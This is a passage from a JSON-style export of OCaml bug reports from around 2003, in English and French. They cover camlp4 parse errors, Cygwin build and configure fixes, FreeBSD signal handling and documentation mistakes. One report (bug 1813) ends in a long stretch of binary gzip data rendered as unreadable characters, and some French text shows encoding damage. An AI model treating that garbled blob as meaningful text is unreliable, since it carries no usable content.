cyclic\n\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1826\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nLe programme suivant:\n\nclass type [ 'node ] extension = object method node : 'node end\nclass type [ 'ext ] node = object constraint 'ext = 'ext node #extension end\nclass x = object method node : x node = assert false end\ntype t = x node\n\nprovoque l'erreur \"The type abbreviation t is cyclic\" avec Ocaml 3.07+beta\n2, et pas 3.06. Sans la methode node, il n'y a pas de problÃ¨me.\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1825\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nPetite regression de Camlp4 entre 3.06 et 3.07+beta 2:\n\nclass a = fun x -> object end\n\nprovoque:\n\nParse error: [class_fun_def] expected after 'fun' (in [class_expr])\n\navec camlp4o.\n\nAu pif, je dirais que le problÃ¨me a Ã©tÃ© introduit lÃ :\nhttp://camlcvs.inria.fr/cgi-bin/cvsweb.cgi/ocaml/camlp4/etc/pa_o.ml.diff?r1=1.44&r2=1.45&f=h\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 1824\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: fabrice crestois\nVersion: 3.06\nOS: windows98\nSubmission from: fw1.adacelcanada.com (192.139.154.2)\n\n\nThe RenameFileEx function uses by otherlibs/win32unix/rename.c is not supported\nin windows98\n\n\nhttp://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/movefileex.asp\n\nWindows Me/98/95:  The MoveFileEx function is not supported. To rename or delete\na file at restart, use the following procedure.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1822\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Kun Gao\nVersion: 3.07 Beta 2\nOS: WinXP, Cygwin latest version\nSubmission from: dhcp-37-83.eecs.berkeley.edu (128.32.37.83)\n\n\nOn Cygwin 3.07 Beta 2, after building everything, 'make install' fails in the\nocamldoc/Makefile. Cygwin seems to have issues copying the ocamldoc executable\nfile to the install location.\n\nThe error it reports is:\ncp -f ocamldoc /usr/local/bin\ncp: `ocamldoc' and `/usr/local/bin/ocamldoc' are the same file\nmake[1]: *** [install] Error 1\n\nThe /ocamldoc/Makefile had to be modified (line 280) from $(OCAMLDOC) to\n$(OCAMLDOC).exe to make get it to copy.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1821\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Gerd-Stolpmann\nVersion: 3.07beta2\nOS: FreeBSD 4.8\nSubmission from: p50816b48.dip0.t-ipconnect.de (80.129.107.72)\n\n\nHello again,\n\nFurther information: the first problem does actually not exist (but the second \nproblem does). The SA_RESTART seems to be part of the thread emulation, and\nactually Unix.select can be interrupted.\n\nI guess the reason I never got the expected EINTR errors for my program is\nthe second problem I reported. This makes the thing a lot easier, because even\nif there is a bug in libc_r, a workaround in the O'Caml runtime is possible,\ne.g. by restoring the signal mask ourselves.\n\nGerd\n"},{"labels":["bug"],"text":"**Original bug ID:** 1820\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Gerd Stolpmann\nVersion: 3.07beta2\nOS: FreeBSD 4.8\nSubmission from: p50816b48.dip0.t-ipconnect.de (80.129.107.72)\n\n\nHello,\n\nI am currently debugging a GODI problem that only occurs if it is run on \nFreeBSD. It is a very strange problem, and may also be libc-related,\nbecause there is a discrepancy between the sources and the actually performed\nsystem calls.\n\nIf one defines a signal handler with Sys.set_signal, strace outputs that\nsigaction is called with SA_RESTART and SA_SIGINFO flags, e.g.\n\nsigaction(SIGALRM, {0x28133264, ~[], SA_RESTART|SA_SIGINFO}, NULL) = 0\n\nfor an attempt to define a SIGALRM handler. I have no explanation for\nthat, because after configuration the C macro POSIX_SIGNALS is defined,\nand the sigaction call in byterun/signal.c looks differently. Especially\nSA_RESTART hurts me, but that's not all.\n\nThe other, more serious problem is that the signal mask is not properly \nreset when the signal happens in a blocking section. This means, everything \nis ok for this situation:\n\n        Objective Caml version 3.07+beta 2\n \n# Sys.set_signal Sys.sigalrm (Sys.Signal_handle (fun _ -> prerr_endline\n\"SIGNAL\"));;\n- : unit = ()\n# while true do () done;;\nSIGNAL\nSIGNAL\nSIGNAL\n\n(I do \"kill -SIGALRM <pid>\" from another terminal.) However, without the\n\"while\" loop, only the first signal is executed, and the other signals\nare ignored. If one prints Unix.sigprocmask SIG_BLOCK [], the output\nis [14], i.e. SIGALRM is blocked. However, in the strace output there is\nno hint why the signal mask is changed.\n\nThis all looks like that there is something wrong in the libc or in the\nkernel, but it might also be bad initialization, I don't know. Another\nobservation is that ocamlrun is linked against libc_r and not libc, and\nthat the signal handlers seem to be \"overloaded\" (in the strace output,\noften additional system calls are done after a signal that have nothing\nto do with ocaml).\n\nFurther data:\nOS: FreeBSD 4.8\nOcaml version: 3.07b2 (not tested with previous versions)\ngcc: 2.95.4\nlibc: libc_r.so.4\n\nGerd Stolpmann\n"},{"labels":["bug"],"text":"**Original bug ID:** 1819\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: George Necula\nVersion: 3.06\nOS: WinXP/cygwin\nSubmission from: raw.cs.berkeley.edu (128.32.153.230)\n\n\n\n the configure script is looking for the X11 libraries with one of the names:\nlibX11.a, libX11.so or libX11.sa. On the latest version of cygwin the library is\ncalled libX11.dll.a. I have added this name to the list of names that configures\nis looking for and now I can build ocaml with LablTk support.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1818\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\ncamlp4o ne semble pas traiter correctement les parametres etiquettes\nabbreges.\n\n        Camlp4 Parsing version 3.07+beta 2\n\n# let f ~age ~name : string * int = age, name;;\n                            ^\nParse error: [fun_binding] expected after [labeled_patt] (in [fun_binding])\n\nCurieusement, il ne semble pas traiter ~name: comme un lexeme, ce qui\nest necessaire pour desambiguer ce cas.\nLe meme problemes se pose avec les classes:\n class person' ~name ~age : person = ...\n\nJacques\n"},{"labels":["bug"],"text":"**Original bug ID:** 1815\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI know this function is deprecated, and it's documented to only accept the \n%x, etc. format strings, but it currently returns bogus results if you pass \nmore than that for the format string.  It should probably throw an \nInvalid_argument exception instead:\n\n         Objective Caml version 3.07+beta 2\n\n# Int64.format \"__ph__float \\\"0x%X\\\"\" (Int64.bits_of_float 1.2345);;\n- : string = \"__ph__float \\\"0x126E978DI64\\\"\"\n\nThe result in the above demo is just totally bogus, although it appears \nokay at first glance.\n\nChris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1813\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI've modified the ocamlwin.exe source and created a MinGW Makefile \nusing the VC Makefile as a starting point for building with MinGW. \nApart from fixing all the warnings (that GCC 3.2.3 detected with \n-Wall), it corrects a bug in the ocaml.exe selection.\n\nThis is against version 3.06, as I haven't been able to build 3.07beta2 \nwith MinGW. I don't expect much trouble integrating the patch against \ncurrent.\n\nBest regards,\nMatÃ­as Giovannini\nScript S.A.\n\n\n----------------\n\u001fâ¹\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003Ã­X{sÃ¢F\u0012ÃÂ­OÃâ¹}ÂµÃÃ±\u0014Â¯\u0018Å¸âÃ°\u0010Å½Â²\u0018(?Ã£Â½KÂ¶(!?`Â²bâ ÅF`.Â¹Ã¯~=\u0002ÃÃ ÃÃÃf?ÃÂ»Â¢Ã\u000fifÂºÂ§Ã»7Ã½ËÃÅ Â²âÃ®Ãs?Ã§RÃ{Ã±,T(\u0016\nÃrÃ¹E\u0001Â©VÂ­DÃ¿\u000bÃºÃ¦\u001dÂ©Z)Ã sÂ­Â¦WÅ zÂ­RÂ®Ã¡xÂ±Â¤ÃÂª/\nÃÂ£Ã>â¦?Â´\u0005n9Å¸RÂ¾Â´\u0019{j\u001d.{.|>'Â¥ÃiXÃ>?Å¸\u0013\u0016Ã¦Å\u0013+$Ã°}Ã¨Æ^âbÂ±^ÃÃ«\u0005\u001dt<2-âºÃ>Â¬ÃÃÂ¹\u001bsÅB\u0006?p\nÂ¥\"\u0014KÃµ22U\u0014GIKÃ¯âzâ¡Ã¢W\u0019â\u001cÂ½*?ÃªÂµ\u0002Ã¸âÃ\u0000N)sÃ¼Ã%?Â LP;7KÂ¼?(HÂ°\u0019ÃÃ¾\u000eKN]0â¢$Bâ\u000bÃWz%ÃXÃª\u0002'qIÂ·ÃÃ©Ã·,hâ¦B\u0010&;ÅÃ\u000b\u001cÂ¦LÃ®\u000euÃ¬9ÃµÃp\tÃÅ½Ã¹Ãh?\u0007Â¦ÃÃº\u000e~ÆNg|Ão\u001bÃ^Ãª\u0000ÃHÂ®}rÂ¡Ã­#ÃÂ£X:\u0004aÃ©)\bcâG\u0018\"KÃ­i\fÃµÃ³LÂ©Ã¼â¬Â¡zÂ½ÃPÃ©iÂ¸TÂ¶PIÃÃ½\u0000Ã­2ÃF\u001bmB$â Ã½Â®Â²\u0005ÃYR\u0007n{Ã­ÃÂ°Ã\u0002a\f\u0004wvfÅâ¢-ÃÂ§Å4CÃ#Ã¢Ã\"FlÂºÂ¤Â¿UÂ¸Âª\râ $ Ã\"w2â \u001bÂ¶ÃÂ¶kÃ±Ã®=ÃÃ¾lÃu\u000fMmÂ·T+&aÂ°~ÅÂ©Å PÃ¹\u0011ÃÃ®Ã±Ã­Â£[ÃÃIÃCÃÃ·\u001e\nÂ°Ã«â¬Ã¿Ã\u001d\\Â¾BÃ¿Ã»zo8?.Ã¥j0Ã»Ã¡Âµ.\u0015Ãâ?F\u001fÃÃ½% Â¨DÂ°\bÅ½Ã±âÃ1\u000fÂ¼â¢Ã\\Å¸$q(\u0002L?â¢1\u001a?Ã^Â§?Â¼nXfÂ¿\u0007\u000bÂªfN]Ã¢!ÃÃÂ¼Ã©ÅÃ\u0019P.ÅWqxd5â ÃÃ@Â­â¡\b\u0016âyÃ¼b\u0013~hk9v??dÃ«\u001f2Ãªâz\fuÆÃ±Ã¸ÂªwÃ\u001a?\u001fÃ¬Ã´9âº\u001e6\u0014Â¹\bÃÂºÃ´\t->|ÃÃ¥LÂ±|Â¾ââÃâ¢LÂ±RÅA9Hâ°\u0011Ã·Ã¤\nsQ\"\u0003â°Ã¾Ã¤gÂ´Å¾.\tÂ´ÃÃ\u0012â¢'â¢Â¢LÂµ\u0010\u0004Ã¿\u000el9CÃ\u0005Ã¾KÂ¥Ã Ã-K>\rÂ¯Ã\u001a\\N\u0002Ã¶J\"D4?Ã\u00004âw\u0010\u0006D@:?Ã±wÂ¢Ë~,Â¼ÃÃ~ÃµSÃ¡ÃÃââz?|Ã\u0014xdÂ¤ÃEâ¡\"Å½â°(#*WÅ Â·Ã½m\u0013\u0010Ã¤Å½Â¼Â¿9Â¢6Ã£Â«Ã¶dz\u001dLâ\tsÂ¾Ã A@'>\u0001Ã\u00011vÃ¡Å¾7\u0007&Ã¼\u0012Râ¢H]ÃÃ³Â¢Â®2YH\u001dÃX/Ã2Âº~\u001eÃ\u0014\u0018Bp\u0011Ãc^Ã\u0003âºÂ­!X\u0007âÃÃÂ±}\u001f<.`5Â³%YÂ¢ÃâÃ\u0001gÃ ÃÃ\u000f2 gÃ¤\u0000Ãrâ Â«\\Ã\u0001ÃÂ¬tÃA?\u0003QÃ»ÃÅ\u0004?=%@\u0003\bÃBâCÃ¶Ã¬'\"<âââºXÃÃË4oÃ³ârÂ¸M1Ãº\u000eS,ÃVÃ\u001dÃÂªpÂ¤pÃ§_wâ?ÃlÃâ¢Â»*Ã^Ã¬L(â°\u000bLÃÂ¨y$?Â¸Â»Â³ÃÃÃhÃ\fMÃ«Å¸Ã£â e\rÃÃ¦?eÅ0â¹\u0007Ã¶eÃ¯Â¦ÃÃ]zha`\u001f\\Ã6FÂ­Â¡9Â°ÃºC\bÂ¢Ã­v\u0016\u0005vÅ½u\tâºÃ\u0019z]@Ã¿MÂ¸â< :Âµ+8Å¸â¡\u001b\fz\u0001ÃL\u0002=+?9Â·?Â¿?Â¡[Ã»jâÃÃ^F\u000eF\u0019â¢ÃÃ¶QÂ²:_\bË\u0013\n*1\u0014HÃ \bÂº?Ã¨.âºRW<ÃÃ¤Â¬Ã\u0007Ã§Ã¿â¢'ÂµoÃ»ÃÃ¶\u0013Â¾Ã\u001dÃ¼Ã7Ã\u0018ÂµÃÅ¾Ã¿/9\u0012fÂ¬âGqÂ Ã®Zj(ÂµÂ±Ã¦KtÂ¶CiÂ¬TÂ©fJU=Ncâº\u0003ËÃ².\\\u0011F\u0004:\u0019ÃÂº\u0002Ã®ââ\u0014Â¾Â±DKâ-kÃ\u001d7â¡FÃ£ÃµÃÃ¸ÃÃ¨YËviÃ]\r6gbÂº;\t8:ÃÂ­â¹E7Â®Â·Âª\bFË,\u0004\u001eÂ¤âÃNbÃyÂ´_Ã¤ÃÃÂ­ÃÃÃÅ¸\u0018Â¦Ã¶+\"Â»v Â£Ã¨HÂ¦Ã®âÂºÃÃ°7Ã¹]R?o\u0006\u001e\u0004F>â ÅÃÃqÃ¿ÃµâÃ¡?ÃÃ[Ãâ X|@\u0017XQ@Ã¥|\u0015ËÂ¥\n^:Â«Ã·Â·Ã/\u0012\u000bÃ¿Â¯\u0000Ã£sÃ·pâ Â®Ã­wx}Ã²ÃsÃ®Ã±?Ã¾_Â¯\u0015ÃµÂ¨Ã¿/â1Â¯WÂ¢Ã¾_?Ã¶Ã¿\r?~*ÃNÃÂ¯Â£\u001fE\u001f?Â´ÃÃ¾3â>^Â§7Ã¶âb=Ã©\u0012ÃÃ\u0019U\\&\u0012Z\u0002ÃÅÃ­gÃÃ¬\rÃ\u0006\fÂ¹Ã³KHËÃC!Å¸QÂ§\u0016_Â¬\u0005?ÃÂ¤jfâ¹`Â²@R\u0019JÃ¨aGÃâ¢Ã­cEÃÅ¾Ãâ¢\u0011?Â¿@\u0018Â¨6HÃq\u0016Âµ\u0003\"\u001f$\u0011Ã\u001fKÂ¾?ÃaÃ?Ã?Htâ¬â&Ã¬=âÃÃQ\u000bÂ«)Â¨ÅÂ¡Â®@.Å¡,Ã¨$ÃKÃÅ½NaTâ U]Ã~c\u001e\u0000Ã·Â¢\u0017Ã¬Ã»Â K'Ã\u0016Ã«m?Ã°a\u0010N|Ã¬Ã¼Â»Ã!,ÃÂ¼Â»Â¢XÃ²\u001f$EÂµyA\u001c,Ãx\u0011sÃB\u0019\u0005Ã¸ÆâÅw\u0014ÃÃMÂ½Å¾Ã Ã¶âmÂ´ÃÃ¥Ã²]Â³eÃ´FFÃ®\u0019\u0010Ã¿dÃâJ?â¢XÂ¡Ã¢Ã¼âºYB1W?Â¾dÃ¤\u000bÃ|Â¡\u0006â¦Ã³z\u0019*pÃ§+?\u0003Ã£n\u0001gÅ¡\u0016Ã·ÃhÂ§Ãâ¢GÂ§Ã¹XâÂ¦ÂµZâSÃ?Ã¬ÅÃ±Â¬Â³Å¾Ã¢EHkuÂº?Â«ÃeÂ¶\u000fÃ[uÅ¸ÃÃÃ¢\\ÃÂ°âtÂµn{;iÃ¦Ã§\bÃ¦*Ã¯Ãâ°Â¦ÃµâºÃ?.w>?Ã°mÃâ¡>\u0000Ã±HÃ´Ã?kZÃl\"Â»Ã¿\u000eÃxÃ¢Â«;Â¹oÂ»K{AÂ£ÃÂ©Â»Ã¹Â¯ÃºÃÃ¨ÃÃ¡x;?Ã?Å½D\u000eMCÂ¥Ãª\u001bÂ¹Â¨Â®j-5mÃ·Â­\u000egIÂ¥QJ;9KÂ¶Z)|ÃËÂ¤Å¾Â¶\u0006Â¤ ÃÃ¡Ã¬ÃxÂ¥Å¡@Â½R[AJÃ±zlÆÂ³}Â \u000eÃNÃEQYâ¦Ã 8ÃÃ³ K\u001fâE\u00125m+Â²\u000eÃ/\u0019Ã°Ã°\u0001RÃ\u001cÅ¸ÃÂ¬Â®?Ë9dÂ½=\u001bv K+Å(SÂ©ÃÃÂµÃbÃ¡Yr04:Ã¦âºTÂ¾Â¯Ã²ÃmÅAntÃQÃ\"GuÃ9Â dÃ¤Â¸z|\u001fâ Â¬\u0003giÅÃ¸Ãâ¢Ã¤HG:ÃâÅ½tÂ¤#\u001dÃ©HG:ÃâÅ½tÂ¤#}Â©Ã´_Â¦Â´IÃ¢\u0000(\u0000\u0000----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1811\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Damien Doligez\nVersion: 3.07+beta (2003-08-18)\nOS: Mac OS X\nSubmission from: macaque.inria.fr (128.93.8.158)\nSubmitted by: doligez\n\n\nLa documentation de mod dit:\n\n   If [y] is not zero, the result\n   of [x mod y] satisfies the following properties:\n   [x = (x / y) * y + x mod y] and\n   [abs(x mod y) < abs(y)].\n\nOr c'est faux:\n\n$ ocaml\n        Objective Caml version 3.07+beta (2003-08-18)\n\n# let x = 1 and y = min_int;;\nval x : int = 1\nval y : int = -1073741824\n# abs(x mod y) < abs(y);;\n- : bool = false\n"},{"labels":["bug"],"text":"**Original bug ID:** 1810\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: \nVersion: 3.07beta1\nOS: linux\nSubmission from: argon.dcs.kcl.ac.uk (137.73.8.3)\n\n\nquand on compile un fichier en syntaxe revisee avec -dtypes, les donnees entre\nguillemets dans le fichier .annot sont vides.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1809\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: CamlLight 0,76\nOS: Sparc Solaris 2.9\nSubmission from: cypress.cs.ubc.ca (142.103.11.23)\n\n\nWhen compiling camllight/contrib from the anonymous cvs respository, I encounter\ntwo problems:\n\n1) some of the fles in the profiler directory are inaccessible - I used the ones\nfrom the cl75unix.tgz without incident.\n\n2) I receive a bus error compiling debugger: the error appears to be with the\n\"-1.\" expression on line 60 of input_handling.ml.  I changed the line from\n            select (map fst !active_files) [] [] (-1.)\nto\n            select (map fst !active_files) [] [] (0. -. 1.)\nand all is well.  This error does not occur under FreeBSD.\n\nChris D.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1808\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\njust realized that GDBM also was not found because Cygwin has the latest\nversion with libgdbm_compat.a but not with gdbm-ndbm.h, there are only\ngdbm.h and ndbm.h headers, and the test looks onkly in libgdbm.a for\ndbm_open where it seems to be no longer, therefore the change needed for\nCygwin to get a full build out of the tarball is:\n\ndiff -Nurd ocaml-3.07beta2~/configure ocaml-3.07beta2/configure\n--- ocaml-3.07beta2~/configure  2003-08-20 17:10:58.000000000 +0200\n+++ ocaml-3.07beta2/configure   2003-08-29 16:10:30.000000000 +0200\n@@ -1194,6 +1194,7 @@\n do\n   if test -f $dir/libX11.a || \\\n      test -f $dir/libX11.so || \\\n+     test -f $dir/libX11.dll.a || \\\n      test -f $dir/libX11.sa; then\n     if test $dir = /usr/lib; then\n       x11_link=\"-lX11\"\n@@ -1240,6 +1241,8 @@\n       dbm_link=\"-ldb1\"\n     elif sh ./hasgot -lgdbm dbm_open; then\n       dbm_link=\"-lgdbm\"\n+    elif sh ./hasgot -lgdbm_compat -lgdbm dbm_open; then\n+      dbm_link=\"-lgdbm_compat -lgdbm\"\n     fi\n     break\n   fi\n\n# END\n\n\nPrevious mail:\n\n> diff -Nurd ocaml-3.07beta2~/configure ocaml-3.07beta2/configure\n> --- ocaml-3.07beta2~/configure  2003-08-20 17:10:58.000000000 +0200\n> +++ ocaml-3.07beta2/configure   2003-08-29 15:23:24.000000000 +0200\n> @@ -1194,6 +1194,7 @@\n>  do\n>    if test -f $dir/libX11.a || \\\n>       test -f $dir/libX11.so || \\\n> +     test -f $dir/libX11.dll.a || \\\n>       test -f $dir/libX11.sa; then\n>      if test $dir = /usr/lib; then\n>        x11_link=\"-lX11\"\n\n> #END\n\n\nGerrit\n-- \n=^..^=\n"},{"labels":["bug"],"text":"**Original bug ID:** 1807\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThis is a CC from: <99176537377.20030829153308@familiehaase.de>\nwhich was sent to: caml-list@inria.fr\n\nHallo,\n\nCygwin changed the naming scheme for X binaries and importlibraries,\nthis means the X11 is not found by configure without this change:\n\ndiff -Nurd ocaml-3.07beta2~/configure ocaml-3.07beta2/configure\n--- ocaml-3.07beta2~/configure  2003-08-20 17:10:58.000000000 +0200\n+++ ocaml-3.07beta2/configure   2003-08-29 15:23:24.000000000 +0200\n@@ -1194,6 +1194,7 @@\n do\n   if test -f $dir/libX11.a || \\\n      test -f $dir/libX11.so || \\\n+     test -f $dir/libX11.dll.a || \\\n      test -f $dir/libX11.sa; then\n     if test $dir = /usr/lib; then\n       x11_link=\"-lX11\"\n\n#END\n\nBesides this it builds clean.\n\nAre there testsuites available to test the different generated\nexecutables for regression?\n\n\nGerrit\n-- \n=^..^=\n"},{"labels":["bug"],"text":"**Original bug ID:** 1806\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christoph Bauer\nVersion: 3.07 beta 2\nOS: Linux\nSubmission from: dialin-212-144-207-013.arcor-ip.net (212.144.207.13)\n\n\nThe manual describes the function \"abs\" as\n\n\"Return the absolute value of the argument.\"\n\nThis is not quite true:\n\n        Objective Caml version 3.07+beta 2\n\n# abs min_int;;\n- : int = -1073741824\n\nIMO abs should throw a Failure exception or the manual should \npoint out this behavior.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1805\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jim Farrand\nVersion: 3.06/3.07beta2\nOS: Debian Gnu/Linux\nSubmission from: 81-86-132-151.dsl.pipex.com (81.86.132.151)\n\n\nThis is actually a bug effecting camlp4 included with OCaml.  Is this the right\nplace to submit such a bug?\n\nHere is a shell history showing the bug:\n\n$ cat crash.ml\n\ntype idref = { id : mutable ! 'a . 'a -> 'a };\n\n$ ocamlmktop -o ocaml /usr/local/ocaml-3.07beta2/lib/ocaml/camlp4/camlp4r.cma\n$ ./ocaml\n        Objective Caml version 3.07+beta 2\n\n        Camlp4 Parsing version 3.07+beta 2\n\n# #use \"crash.ml\" ;\ntype idref =\n  { id :\n      mutable (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((\n(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((\n... snip several more pages of (s ...\n(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((\n((((Fatal error: exception Stack_overflow\n\nStrangely, the file crash.ml can be compild with ocamlc -pp camlp4r and loaded\ninto the top level without any problems.\n\nI get this behaviour in both 3.06 and 3.07beta2.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1801\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.07+beta2\nOS: Solaris 9\nSubmission from: cypress.cs.ubc.ca (142.103.11.23)\n\n\nAn incompatibility with Solaris(SysV?) 'make' has crept into the construction of\n.depend files (only for otherlibs/camltk/{camltk,labltk}).  Performing a 'make\nclean' (or make \"anything\") fails in that directory with \n\nmake: Warning: Can't find `.depend': No such file or directory\nCurrent working directory .../ocaml-3.07/otherlibs/labltk/camltk\nmake: Fatal error in reader: Makefile, line 44: Read of include file `.depend'\nfailed\nCurrent working directory .../ocaml-3.07/otherlibs/labltk/camltk\n*** Error code 1\nmake: Fatal error: Command failed for target `clean'\nCurrent working directory .../ocaml-3.07/otherlibs/labltk\n*** Error code 1\nmake: Fatal error: Command failed for target `clean'\n\nGNU make (aka gmake) works correctly.\n\nI didn't experience this problem with 3.07+beta1, and I don't think my version\nof make changed.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1794\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Yamagata Yoriyuki\nVersion: 3.06\nOS: Linux\nSubmission from: p2114-adsau14honb7-acca.tokyo.ocn.ne.jp (220.106.58.114)\n\n\nWhen opening a ocaml file, emacs emits the flowing error.  (As displayed in\n*Message* buffer.)  I am using emacs-21.2.1.\n\nUnhighlighting\nDone unhighlighting\nhighlighting 11: \\(^\\|[^\"]\\)\\((\\*[^*]*\\*+\\([^)*][^*]*\\*+\\)*)\\)\nhighlighting 10: hilit-string-find\nhighlighting 9: '\\(\\\\\\([ntbr'\\]\\|[0-9][0-9][0-9]\\)\\|.\\)'\nhighlighting 8: \\(\\([~?]\\|\\<\\)[a-z][a-zA-Z0-9_']*:\\)[^:=]\nhighlighting 7: [~?][ (]*[a-z][a-zA-Z0-9_']*\nhighlighting 6: \\<\\(assert\\|open\\|include\\)\\>\nhighlighting 5: `?\\<[A-Z][A-Za-z0-9_']*\\>\nhighlighting 4: \\<\\(a\\(nd\\|s\\)\\|c\\(onstraint\\|lass\\)\\|ex\\(ception\\|ternal\\)\\|fun\\(ct\\(ion\\|or\\)\\)?\\|in\\(herit\\)?\\|let\\|m\\(ethod\\|utable\\|odule\\)\\|of\\|p\\(arser\\|rivate\\)\\|rec\\|type\\|v\\(al\\(ue\\)?\\|irtual\\)\\)\\>\nhighlighting 3: \\<\\(object\\|struct\\|sig\\|begin\\|end\\)\\>\nError: '(wrong-type-argument integer-or-marker-p nil)'\nhighlighting 2: \\<\\(do\\(ne\\|wnto\\)?\\|else\\|for\\|i\\(f\\|gnore\\)\\|lazy\\|match\\|new\\|or\\|t\\(hen\\|o\\|ry\\)\\|w\\(h\\(en\\|ile\\)\\|ith\\)\\)\\>\\||\\|->\\|&\\|#\nhighlighting 1: ;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1793\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Martin Jambon\nVersion: 3.07-beta1\nOS: i386/Linux\nSubmission from: f08a-7-100.d1.club-internet.fr (212.194.174.100)\n\n\nReprinting classic syntax fails with optional arguments:\n\n$ cat toto.ml\nlet f ?a () = ()\n\n$ camlp4o -I +camlp4 pr_o.cmo toto.ml\nFailure: unable to print patt\n\nHowever, optional arguments with default value work as in `let f ?(a = 0) () =\n...'\n\nThis problem didn't happen with the development version I was using before\n(3.06+20 (2002-12-12))\n"},{"labels":["bug"],"text":"**Original bug ID:** 1792\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nNe serait-ce pas un bug que l'exception levÃ©e par String.get en cas de\nmauvais indexe soit :\n- Invalid_argument (\"String.get\") quand on compile avec ocamlc\n- et Invalid_argument (\"out-of-bound array or string access\") quand on\ncompile avec ocamlopt ?\n\nL'effet pervers est qu'un mÃªme programme peut s'exÃ©cuter diffÃ©remment\nselon qu'il est compilÃ© en natif ou pas. Par exemple :\n\ntry\n  print_char \"\".[0]\nwith\n| Invalid_argument (\"String.get\") -> ()\n\nplante dans un cas et pas dans l'autre.\n\n\nEnfin, tout cela doit vous sembler platement trivial mais si cette\nmodeste remarque peut contribuer Ã  embellir votre bel Ã©difice, j'en\nserai heureux.\n\nCordialement,\n\nlaurent\n"},{"labels":["bug"],"text":"**Original bug ID:** 1790\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## 